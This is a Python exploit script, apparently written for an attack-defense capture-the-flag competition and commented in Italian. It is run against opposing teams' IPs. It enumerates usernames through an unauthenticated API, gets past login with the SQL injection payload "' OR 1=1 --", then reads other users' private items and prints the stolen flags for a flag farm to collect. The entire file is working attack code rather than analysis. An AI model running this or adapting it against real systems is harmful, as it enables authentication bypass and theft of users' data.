import sys
import requests
import json

# Configurazione locale dello sploit
PORT_API = '5050'
MAX_TIMEOUT = 2

def get_username(ip, user_id):
    url = f"http://{ip}:{PORT_API}/api/user/{user_id}"
    try:
        r = requests.get(url, timeout=MAX_TIMEOUT)
        if r.status_code == 200:
            return r.json().get('user')
    except Exception:
        pass
    return None

def exploit_single_team(team_ip, users_dict):
    """
    Esegue l'exploit contro un singolo IP usando i dati passati dal farm
    """
    for tick, info in users_dict.items():
        uid = info.get('user_id')
        username = get_username(team_ip, uid)
        
        if not username:
            continue
            
        session = requests.Session()
        try:
            # Login Bypass SQLi
            login_payload = {"username": username, "password": "' OR 1=1 --"}
            l_res = session.post(f"http://{team_ip}:{PORT_API}/api/login", json=login_payload, timeout=MAX_TIMEOUT)
            
            if l_res.status_code == 200:
                # Ottenimento item utente
                i_res = session.get(f"http://{team_ip}:{PORT_API}/api/user/items", timeout=MAX_TIMEOUT)
                if i_res.status_code == 200:
                    items = i_res.json().get('items', [])
                    for item in items:
                        if item.get('name') == "Treasure":
                            flag = item.get('personal_description')
                            if flag:
                                # CRITICO: Il farm legge lo stdout. 
                                # Stampiamo la flag pura in modo che il regex del farm la prenda.
                                print(flag, flush=True)
        except Exception:
            continue

if __name__ == "__main__":
    # La maggior parte dei farm passa l'IP come primo argomento: python sploit.py <IP>
    if len(sys.argv) < 2:
        print("Uso: python sploit.py <TARGET_IP> [FLAG_ID_JSON]", file=sys.stderr)
        sys.exit(1)
        
    target_ip = sys.argv[1]
    
    # Gestione dei Flag ID (se il farm te li passa come stringa JSON nel secondo argomento)
    users_data = {}
    if len(sys.argv) > 2:
        try:
            users_data = json.loads(sys.argv[2])
        except Exception:
            pass

    exploit_single_team(target_ip, users_data)